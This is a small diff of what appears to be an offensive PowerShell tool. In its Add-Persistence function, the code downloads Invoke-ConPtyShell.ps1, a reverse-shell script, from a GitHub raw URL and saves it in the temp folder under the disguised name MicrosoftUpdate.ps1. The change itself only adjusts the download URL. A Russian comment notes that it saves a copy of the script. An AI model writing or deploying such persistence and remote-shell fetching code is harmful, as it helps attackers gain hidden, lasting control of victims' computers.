@@ -17,7 +17,7 @@ function Connect-ZiPo {
     function Add-Persistence {
     try {
         $targetPath = "$env:TEMP\MicrosoftUpdate.ps1"
-        $url = "https://raw.githubusercontent.com/zipo0/studytime-/refs/heads/main/Invoke-ConPtyShell.ps1"
+        $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
 
         # Скачиваем и сохраняем копию скрипта
         Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
